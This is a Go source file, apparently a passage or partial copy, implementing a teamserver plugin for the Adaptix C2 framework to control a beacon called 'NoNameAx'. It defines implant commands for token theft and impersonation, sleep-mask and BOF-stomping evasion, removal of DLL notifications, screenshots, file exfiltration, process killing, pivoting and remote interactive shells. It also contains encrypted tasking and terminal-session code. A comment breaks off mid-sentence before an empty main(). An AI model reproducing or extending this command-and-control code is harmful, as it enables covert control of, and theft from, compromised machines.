package main

import (
	"encoding/binary"
	"fmt"
	"math/rand"
	"strings"
	"sync"

	adaptix "github.com/Adaptix-Framework/axc2/v2"
	"nonameax/naxwire"
)

// Ts callback constants - match Adaptix SDK values.
const (
	taskTypeTask           = adaptix.TASK_TYPE_TASK  // runnable command
	messageSeverityInfo    = adaptix.MESSAGE_INFO    // blue info in operator console
	messageSeverityError   = adaptix.MESSAGE_ERROR   // red error
	messageSeveritySuccess = adaptix.MESSAGE_SUCCESS // green success
)

const naxLogSource = "NoNameAx"

func naxLogInfo(format string, args ...any) {
	if Ts != nil {
		Ts.TsLogAdd(adaptix.LogStatusInfo, 1, naxLogSource, format, args...)
	} else {
		fmt.Printf("[NoNameAx] [*] "+format+"\n", args...)
	}
}

func naxLogOk(format string, args ...any) {
	if Ts != nil {
		Ts.TsLogAdd(adaptix.LogStatusSuccess, 1, naxLogSource, format, args...)
	} else {
		fmt.Printf("[NoNameAx] [+] "+format+"\n", args...)
	}
}

func naxLogErr(format string, args ...any) {
	if Ts != nil {
		Ts.TsLogAdd(adaptix.LogStatusError, 0, naxLogSource, format, args...)
	} else {
		fmt.Printf("[NoNameAx] [-] "+format+"\n", args...)
	}
}

// NaX wire command IDs - must match Wire.h NAX_CMD_* in the C beacon.
const (
	CMD_WHOAMI            byte = 0x10
	CMD_SLEEP             byte = 0x11
	CMD_EXIT_THREAD       byte = 0x12
	CMD_EXIT_PROC         byte = 0x13
	CMD_CD                byte = 0x14
	CMD_PWD               byte = 0x15
	CMD_MKDIR             byte = 0x16
	CMD_RMDIR             byte = 0x17
	CMD_CAT               byte = 0x18
	CMD_LS                byte = 0x19
	CMD_CP                byte = 0x1A
	CMD_MV                byte = 0x1B
	CMD_BOF               byte = 0x20
	CMD_SCREENSHOT        byte = 0x21
	CMD_DOWNLOAD          byte = 0x22
	CMD_PS_LIST           byte = 0x23
	CMD_PS_KILL           byte = 0x24
	CMD_PS_RUN            byte = 0x25
	CMD_UPLOAD            byte = 0x26
	CMD_RM                byte = 0x27
	CMD_SAVEMEMORY        byte = 0x2A
	CMD_CHUNKSIZE         byte = 0x2B
	CMD_PROFILE           byte = 0x30
	CMD_PIVOT_EXEC        byte = 0x37
	CMD_LINK              byte = 0x38
	CMD_UNLINK            byte = 0x39
	CMD_JOB_LIST          byte = 0x28
	CMD_JOB_KILL          byte = 0x29
	CMD_WATCHDOG_SET      byte = 0x2C
	CMD_BOF_STOMP         byte = 0x31
	CMD_SLEEPMASK_SET     byte = 0x32
	CMD_SLEEPOBF_CONFIG   byte = 0x33
	CMD_TOKEN_GETUID byte = 0x50
	CMD_TOKEN_STEAL  byte = 0x51
	CMD_TOKEN_USE    byte = 0x52
	CMD_TOKEN_LIST   byte = 0x53
	CMD_TOKEN_RM     byte = 0x54
	CMD_TOKEN_REVERT byte = 0x55
	CMD_TOKEN_MAKE   byte = 0x56
	CMD_TOKEN_PRIVS  byte = 0x57
	CMD_DLL_NOTIFY_LIST   byte = 0x3A
	CMD_DLL_NOTIFY_REMOVE byte = 0x3B
	CMD_SHELL_START        byte = 0x47
	CMD_SHELL_WRITE        byte = 0x48
	CMD_SHELL_CLOSE        byte = 0x49

	JOB_OUTPUT   byte = 0x01
	JOB_COMPLETE byte = 0x02
	JOB_KILLED   byte = 0x03
)

// NaX wire status codes - must match Wire.h NAX_STATUS_* in the C beacon.
const (
	STATUS_OK    byte = 0x00
	STATUS_ERR   byte = 0x01
	STATUS_ASYNC byte = 0x10
)

// Task dispatch priority - higher value = dispatched first.
const (
	priorityTask         uint = 0
	priorityTunnelCreate uint = 10
	priorityTunnelData   uint = 11
	priorityTunnelClose  uint = 12
)

// Adaptix BOF callback type tags - must match Bof.h CALLBACK_AX_* in the C beacon.
const (
	CALLBACK_SCREENSHOT byte = 0x81 // CALLBACK_AX_SCREENSHOT
	CALLBACK_DOWNLOAD   byte = 0x82 // CALLBACK_AX_DOWNLOAD_MEM

	DL_START    byte = 0x01
	DL_CONTINUE byte = 0x02
	DL_FINISH   byte = 0x03

	UPLOAD_CHUNK_DEFAULT = 0x200000 // 2 MB
	UPLOAD_CHUNK_MAX     = 0x400000 // 4 MB
	UPLOAD_CHUNK_MIN     = 4096
)


type PluginAgent struct{}

var (
	Ts             adaptix.Teamserver
	ModuleDir      string
	AgentWatermark string

	// agentIdentityCache caches the identity fields parsed from a REGISTER frame
	// so that re-registrations triggered by HEARTBEAT frames (after the operator
	// deletes a session from the UI) can return the full Computer/Username/etc.
	// rather than bare placeholder values.
	// Key: beaconID (string), Value: adaptix.AgentData (identity fields only).
	agentIdentityCache sync.Map

	// agentIdToBeaconId maps the server-assigned int64 agent ID back to the
	// beacon's UID string so that event hooks (which receive int64) can look
	// up the beaconID for cache cleanup.
	// Key: int64 (agentId), Value: string (beaconID).
	agentIdToBeaconId sync.Map

	// pendingCmdIds tracks the cmd_id (first byte of task.Data) for each in-flight
	// task so that ProcessData can take type-specific actions when the result arrives
	// (e.g. calling TsAgentUpdateData after a CMD_SLEEP response).
	// Key: TaskId (int64), Value: cmd_id (byte).
	pendingCmdIds sync.Map

	// activeJobs tracks async BOF jobs that have been acknowledged (STATUS_ASYNC)
	// but not yet completed. When a result arrives for a tracked taskId, it's
	// handled as job output rather than a regular command result.
	// Key: TaskId (int64), Value: true.
	activeJobs sync.Map

	// activeShells tracks remote shell sessions. When a SHELL_START task
	// is dispatched, the taskId (= terminalId) is stored here. Results
	// arriving for tracked shell IDs route to terminal handling.
	// Key: TaskId (int64), Value: true.
	activeShells sync.Map

	// activeDownloads tracks chunked downloads in progress.  The first result
	// (DL_START) stores the cmdId here; subsequent results (DL_CONTINUE/DL_FINISH)
	// use it since pendingCmdIds is consumed on the first hit.
	// Key: TaskId (int64), Value: true.
	activeDownloads sync.Map

	// pendingProfiles holds the naxwire.ProfileConfig for CMD_PROFILE tasks that have
	// been sent to the beacon but not yet confirmed.
	// Key: agentId (int64), Value: *naxwire.ProfileConfig.
	pendingProfiles sync.Map

	// sleepmaskBofCache holds the compiled sleepmask BOF (.o) bytes.
	// Built during BuildPayload when beacongate is enabled.
	// Sent to agents via CMD_SLEEPMASK_SET command.
	sleepmaskBofCache []byte
)

const (
	extenderNameProfiles = "nax_profiles"
	extenderNameAgents   = "nax_agents"
	extenderNamePivots   = "nax_pivots"
)

// InitPlugin is the symbol Adaptix Server looks up after loading the .so.
// Signature mirrors the reference plugin.
func InitPlugin(ts any, moduleDir string, watermark string) adaptix.PluginAgent {
	ModuleDir = moduleDir
	AgentWatermark = watermark
	Ts = ts.(adaptix.Teamserver)
	loadCacheFromStore()
	registerCleanupHooks()
	return &PluginAgent{}
}

func (p *PluginAgent) Call(operator string, agentId int64, function string, args string) {
	_ = operator
	_ = agentId
	_ = function
	_ = args
}

func (p *PluginAgent) GenerateProfiles(profile adaptix.BuildProfile) ([][]byte, error) {
	return nil, nil
}

func (p *PluginAgent) AgentRestore(agentData adaptix.AgentData) adaptix.AgentFunctions {
	beaconID := string(agentData.UID)
	if beaconID != "" {
		agentIdToBeaconId.Store(agentData.Id, beaconID)
	}
	return buildAgentFunctions()
}

/* ========= [ AgentFunctions builder ] ========= */

func buildAgentFunctions() adaptix.AgentFunctions {
	return adaptix.AgentFunctions{
		CreateCommand: naxCreateCommand,
		PackTasks:     naxPackTasks,
		ProcessData:   naxProcessData,
		Encrypt:       naxEncrypt,
		Decrypt:       naxDecrypt,
		Delivery:      nil,
		PivotPackData: naxPivotPackData,
		TunnelCB:      naxTunnelCallbacks(),
		TerminalCB:    naxTerminalCallbacks(),
	}
}

/* ========= [ AgentFunctions crypto ] ========= */

func naxEncrypt(data []byte, key []byte) ([]byte, error) {
	if len(key) != 16 {
		return data, nil
	}
	return naxwire.EncryptCBCRandomIV(key, data)
}

func naxDecrypt(data []byte, key []byte) ([]byte, error) {
	if len(key) != 16 {
		return data, nil
	}
	return naxwire.DecryptCBC(key, data)
}

func naxPackTasks(agentData adaptix.AgentData, tasks []adaptix.TaskData) ([]byte, error) {
	if len(tasks) == 0 {
		return nil, nil
	}
	var out []byte
	for _, task := range tasks {
		if len(task.Data) == 0 {
			continue
		}
		pendingCmdIds.Store(task.TaskId, task.Data[0])
		body := naxwire.EncodeTaskBody(uint32(task.TaskId), task.Data)
		out = append(out, naxwire.EncodeFrame(naxwire.WireTypeTask, body)...)
	}
	return out, nil
}

func naxPivotPackData(pivotId string, data []byte) (adaptix.TaskData, error) {
	if len(data) == 0 {
		return adaptix.TaskData{}, fmt.Errorf("nonameax: PivotPackData: empty data for pivotId %q (child has no tasks)", pivotId)
	}
	pivotIdInt, err := parseHexUint32(pivotId)
	if err != nil {
		return adaptix.TaskData{}, fmt.Errorf("nonameax: PivotPackData: bad pivotId %q: %w", pivotId, err)
	}
	// Wire: cmd_id(1) | args_len(4LE) | pivot_id(4LE) | data_len(4LE) | data
	argsLen := 4 + 4 + len(data)
	buf := make([]byte, 5+argsLen)
	buf[0] = CMD_PIVOT_EXEC
	binary.LittleEndian.PutUint32(buf[1:5], uint32(argsLen))
	binary.LittleEndian.PutUint32(buf[5:9], pivotIdInt)
	binary.LittleEndian.PutUint32(buf[9:13], uint32(len(data)))
	copy(buf[13:], data)

	var taskId int64
	if Ts != nil {
		taskId = Ts.TsTaskGenID()
	} else {
		taskId = int64(rand.Uint32())
	}
	td := adaptix.MakeProxyTask(buf, priorityTunnelData)
	td.TaskId = taskId
	return td, nil
}

func parseHexUint32(s string) (uint32, error) {
	var v uint64
	for _, c := range s {
		v <<= 4
		switch {
		case c >= '0' && c <= '9':
			v |= uint64(c - '0')
		case c >= 'a' && c <= 'f':
			v |= uint64(c-'a') + 10
		case c >= 'A' && c <= 'F':
			v |= uint64(c-'A') + 10
		default:
			return 0, fmt.Errorf("invalid hex char %q", c)
		}
	}
	if v > 0xFFFFFFFF {
		return 0, fmt.Errorf("value exceeds uint32")
	}
	return uint32(v), nil
}

func naxTunnelCallbacks() adaptix.TunnelCallbacks {
	return adaptix.TunnelCallbacks{
		ConnectTCP: tunnelConnectTCP,
		ConnectUDP: tunnelConnectUDP,
		WriteTCP:   tunnelWriteTCP,
		WriteUDP:   tunnelWriteUDP,
		Pause:      tunnelPause,
		Resume:     tunnelResume,
		Close:      tunnelClose,
		Reverse:    tunnelReverse,
	}
}

func naxTerminalCallbacks() adaptix.TerminalCallbacks {
	return adaptix.TerminalCallbacks{
		Start: terminalStart,
		Write: terminalWrite,
		Close: terminalClose,
	}
}

func terminalStart(terminalId int64, program string, sizeH int, sizeW int, oemCP int) adaptix.TaskData {
	activeShells.Store(terminalId, true)

	programOEM := ""
	if Ts != nil {
		programOEM = Ts.TsConvertUTF8toCp(program, oemCP)
	} else {
		programOEM = program
	}
	programBytes := []byte(programOEM)

	// Wire: cmd_id(1) | args_len(4LE) | program_len(4LE) | program_bytes
	argsLen := 4 + len(programBytes)
	data := make([]byte, 5+argsLen)
	data[0] = CMD_SHELL_START
	binary.LittleEndian.PutUint32(data[1:5], uint32(argsLen))
	binary.LittleEndian.PutUint32(data[5:9], uint32(len(programBytes)))
	copy(data[9:], programBytes)

	td := adaptix.MakeProxyTask(data, priorityTunnelCreate)
	td.TaskId = terminalId
	return td
}

func terminalWrite(terminalId int64, oemCP int, data []byte) adaptix.TaskData {
	dataOEM := ""
	if Ts != nil {
		dataOEM = Ts.TsConvertUTF8toCp(string(data), oemCP)
	} else {
		dataOEM = string(data)
	}
	if oemCP > 0 {
		dataOEM = strings.ReplaceAll(dataOEM, "\n", "\r\n")
	}
	dataBytes := []byte(dataOEM)

	// Wire: cmd_id(1) | args_len(4LE) | terminalId(4LE) | data_len(4LE) | data_bytes
	argsLen := 4 + 4 + len(dataBytes)
	buf := make([]byte, 5+argsLen)
	buf[0] = CMD_SHELL_WRITE
	binary.LittleEndian.PutUint32(buf[1:5], uint32(argsLen))
	binary.LittleEndian.PutUint32(buf[5:9], uint32(terminalId))
	binary.LittleEndian.PutUint32(buf[9:13], uint32(len(dataBytes)))
	copy(buf[13:], dataBytes)

	var taskId int64
	if Ts != nil {
		taskId = Ts.TsTaskGenID()
	} else {
		taskId = int64(rand.Uint32())
	}
	td := adaptix.MakeProxyTask(buf, priorityTunnelData)
	td.TaskId = taskId
	return td
}

func terminalClose(terminalId int64) adaptix.TaskData {
	activeShells.Delete(terminalId)

	// Wire: cmd_id(1) | args_len(4LE) | terminalId(4LE)
	data := make([]byte, 9)
	data[0] = CMD_SHELL_CLOSE
	binary.LittleEndian.PutUint32(data[1:5], 4)
	binary.LittleEndian.PutUint32(data[5:9], uint32(terminalId))

	var taskId int64
	if Ts != nil {
		taskId = Ts.TsTaskGenID()
	} else {
		taskId = int64(rand.Uint32())
	}
	td := adaptix.MakeProxyTask(data, priorityTunnelClose)
	td.TaskId = taskId
	return td
}

// saveProfileToStore persists a profile override via TsExtenderData so the
func main() {}
